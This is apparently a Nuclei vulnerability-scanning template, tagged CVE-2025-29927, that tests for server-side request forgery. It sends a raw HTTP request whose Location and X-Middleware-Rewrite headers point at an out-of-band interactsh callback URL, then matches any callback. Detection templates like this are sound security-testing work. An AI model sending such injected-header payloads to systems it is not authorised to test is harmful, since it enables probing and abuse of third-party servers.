id: CVE-2025-29927

info:
  name: Middleware Rewrite Header Injection
  author: rootplinix
  severity: high
  description: |
    Tests if the X-Middleware-Rewrite or Location header can be abused to 
    trigger SSRF / external callbacks by rewriting requests to an attacker-controlled domain.
  tags: ssrf,header,injection,oast

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Location: http://{{interactsh-url}}
        X-Middleware-Rewrite: http://{{interactsh-url}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "{{interactsh-url}}"
        part: interactsh_request

      - type: word
        words:
          - "{{interactsh-url}}"
        part: interactsh_response
